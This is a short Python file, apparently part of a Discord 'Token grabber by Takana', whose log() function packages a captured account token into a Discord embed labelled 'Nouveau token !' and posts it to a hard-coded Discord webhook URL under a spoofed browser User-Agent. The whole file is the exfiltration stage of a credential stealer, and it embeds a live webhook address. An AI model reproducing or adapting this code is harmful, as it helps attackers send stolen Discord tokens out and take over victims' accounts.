from json import dumps
from urllib.request import Request, urlopen

def log(token):
    print("okk")
    embeds = []
    embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Nouveau token !**",
                        "value": token,
                        "inline": False
                    }
                ],
                "footer": {
                    "text": f"Token grabber by Takana"
                }
            }
    embeds.append(embed)
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Token Grabber",
    }
    urlopen(Request("https://canary.discord.com/api/webhooks/837355902540709949/6xMyMJPxQ5STOsK0l6QXR9E7rC5x1Ag_M5gafA05M5_OurmRVcoVxgJUW2iIKsKvvyOm", data=dumps(webhook).encode(), headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }))

if __name__ == "__main__": log("test")